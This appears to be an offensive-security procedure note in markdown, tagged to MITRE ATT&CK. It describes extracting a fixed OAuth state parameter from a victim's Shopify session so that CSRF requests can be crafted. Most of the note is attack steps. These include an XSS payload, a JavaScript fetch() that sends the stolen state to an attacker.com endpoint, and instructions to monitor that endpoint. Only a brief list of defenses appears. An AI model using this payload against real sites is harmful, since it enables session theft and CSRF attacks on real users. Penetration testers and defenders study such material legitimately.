---
id: proc-uuid-003
tags:
  - xss
  - state-extraction
  - csrf
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:27:15.862Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Obtain-Fixed-State-Parameter

## Summary

This procedure extracts the fixed OAuth state parameter from the victim's session, typically via XSS or session hijacking, enabling prediction for CSRF attacks.

## Description

The state 'c2f449f2df5ee64df6173702846bce72e3a57319' is static and can be stolen from the victim's browser or app session. This violates OAuth best practices and allows attackers to craft requests that bypass CSRF protections.

## Requirements

1. XSS vulnerability or access to victim's Shopify session
2. JavaScript payload for extraction
3. Attacker-controlled endpoint for exfiltration

## Defense

Defensive measures and detection strategies:

- Sanitize inputs to prevent XSS
- Use HttpOnly cookies for session tokens
- Implement Content Security Policy (CSP)

## Objectives

1. Inject payload to capture state
2. Exfiltrate to attacker
3. Verify state predictability

## Instructions

### Step 1: Inject XSS Payload

**Context**: Exploit an XSS vector in the victim's Shopify page to run a script that logs the state.

**Instructions**: Inject <script>alert(document.location.search)</script> or a more stealthy payload like:

```javascript
fetch('https://attacker.com/steal?state=' + encodeURIComponent(new URLSearchParams(window.location.search).get('state')));
```

> Expected: State value sent to attacker server.

### Step 2: Confirm Extraction

**Context**: Receive and validate the stolen state on attacker side.

**Instructions**: Monitor attacker endpoint for incoming requests containing 'c2f449f2df5ee64df6173702846bce72e3a57319'.

> Expected: Fixed state matches known value, confirming fixation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[state-extraction]]
- [[csrf]]
